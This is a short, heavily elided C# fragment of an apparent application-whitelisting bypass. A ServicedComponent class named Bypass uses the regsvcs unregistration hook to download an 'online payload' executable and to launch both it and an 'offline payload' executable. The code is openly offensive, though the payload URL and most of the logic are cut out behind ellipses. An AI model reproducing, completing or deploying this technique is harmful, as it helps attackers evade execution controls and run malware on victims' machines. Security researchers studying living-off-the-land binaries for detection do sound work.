...
namespace RegsvcsUnRegBypass
{
    ...
    public class Bypass : ServicedComponent
    {
        ...
        public static void UnRegisterClass(string key)
        {
            ...
            string fileName = "RegsvcsUnRegOnlinePayloadDownloaded.exe", myStringWebResource = null;
            ...
            startInfoA.FileName = "RegsvcsUnRegOnlinePayloadDownloaded.exe";
            ...
            startInfoB.FileName = "RegsvcsUnRegOfflinePayload.exe";
